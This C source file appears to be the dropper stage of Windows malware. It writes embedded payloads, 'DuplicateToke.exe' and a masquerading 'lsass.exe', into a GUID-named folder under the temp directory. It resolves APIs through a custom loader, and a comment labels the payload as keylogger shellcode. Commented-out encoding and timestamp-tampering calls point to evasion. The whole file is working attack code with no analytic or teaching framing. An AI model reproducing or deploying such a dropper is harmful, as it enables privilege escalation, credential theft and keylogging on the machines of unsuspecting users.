#include <windows.h>
#include <stdio.h>

#include "LoadAPI.h"
#include "DuplicateToke.h"
#include "lsass.h"
#include "DebugFunc.h"

//BOOL DirectoryExists(Kernel32_API Kernel32Api,const char* Directory) {
//	DWORD dwAttrib = Kernel32Api.GetFileAttributesAF(Directory);
//	return (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
//}
BOOL CreateDirectoryF(Kernel32_API Kernel32Api,char* Directory) {
	if (!Kernel32Api.CreateDirectoryAF(Directory, NULL)) {
		int lastError = GetLastError();

		if (lastError == ERROR_ALREADY_EXISTS)
			return TRUE;
		else if (lastError == ERROR_PATH_NOT_FOUND)
			PrintDebug("[x] ERROR PATH NOT FOUND ! (%s)\n", Directory);
		else
			PrintDebug("[x] ERROR UNKNOWN Creating directory: '%s'!\n", Directory);
		return FALSE;
	}
	else
		PrintDebug("\t[i] Directory create: '%s'\n", Directory);
	//SetDirectoryAttributes(Directory);
	return TRUE;
}


typedef struct {
	const char* filename;
	unsigned int fileSize;
	const char* filePayload;
}DropFileStruct;

char* GetDropPath(Kernel32_API Kernel32Api) {
	char* dropPath = (char*)calloc(MAX_PATH + 1, 1);
	if (dropPath == NULL)
		return NULL;
	
	if (Kernel32Api.GetTempPathAF(MAX_PATH, dropPath) > 0)
		strcat_s(dropPath, MAX_PATH, "23E8BC3FE-A258-CF1F-FDD0-F5B3ECFC7A6\\");
	CreateDirectoryF(Kernel32Api,dropPath);


	return dropPath;
}

BOOL DropFile(Kernel32_API Kernel32Api, char* fileDropPath, DropFileStruct dropFileStruct) {
	HANDLE hFile = Kernel32Api.CreateFileAF(fileDropPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		DWORD dwBytesWritten = 0;
		
		//encodingRoutine((char*)tabDropFile[i].data, (unsigned int)tabDropFile[i].size, (char*)tabDropFile[i].encryptionKey, (int)strlen(tabDropFile[i].encryptionKey));
		if (!Kernel32Api.WriteFileF(hFile, dropFileStruct.filePayload, (DWORD)dropFileStruct.fileSize, &dwBytesWritten, NULL) || !dwBytesWritten) { //  shellcode_Keylog  !!!!
			PrintDebug("[X] Unable to write in the file :'%i'\n", GetLastError());
			Kernel32Api.CloseHandleF(hFile);
			return FALSE;
		}
		else
			PrintDebug("\t[-] Dropped %s size %.3ld Kbytes\n", dropFileStruct.filename, dwBytesWritten / 1000);

		/*
		SetFileToCurrentTime(Kernel32API, hFile);

		if (Kernel32API.GetFileAttributesAF(program) == INVALID_FILE_ATTRIBUTES) {
			return FALSE;
		}
		*/
		Kernel32Api.CloseHandleF(hFile);
	}
	return TRUE;
}



BOOL DropFiles(Kernel32_API Kernel32Api) {
	char* dropPath = GetDropPath(Kernel32Api);
	if (dropPath != NULL) {

		DropFileStruct dropFileStruct[2] = {
			{"DuplicateToke.exe",fileSizeDuplicateTokeFile,DuplicateTokeFile},
			{"lsass.exe", fileSizelsass, lsass}
		};

		for (int i = 0; i < sizeof(dropFileStruct) / sizeof(DropFileStruct); i++) {
			char* fileDropPath = (char*)calloc(MAX_PATH + 1, 1);
			if (fileDropPath == NULL)
				return FALSE;
			strcpy_s(fileDropPath, MAX_PATH, dropPath);
			strcat_s(fileDropPath, MAX_PATH, dropFileStruct[i].filename);
			DropFile(Kernel32Api, fileDropPath, dropFileStruct[i]);
			free(fileDropPath);
		}
		free(dropPath);
	}
	else
		return FALSE;

	return TRUE;
}
